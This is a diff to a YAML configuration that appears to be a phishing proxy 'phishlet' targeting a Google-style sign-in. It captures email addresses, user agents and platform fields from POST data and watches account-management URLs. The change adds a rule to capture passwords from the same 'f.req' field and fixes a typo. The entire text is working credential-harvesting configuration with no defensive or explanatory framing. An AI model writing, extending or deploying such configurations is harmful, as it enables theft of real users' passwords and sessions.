@@ -24,6 +24,10 @@ credentials:
     key: 'f.req'
     search: '([a-zA-Z0-9+._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)'
     type: 'post'
+  password:
+    key: 'f.req'
+    search: '1'
+    type: 'post'
   custom:
     - key: 'useragent'
       search: '(.*)'
@@ -36,7 +40,7 @@ credentials:
       type: 'post'
     - key: 'platform'
       search: '(.*)'
-      type: 'post'aml
+      type: 'post'
 auth_urls:
   - '/CheckCookie'
   - '/ManageAccount'
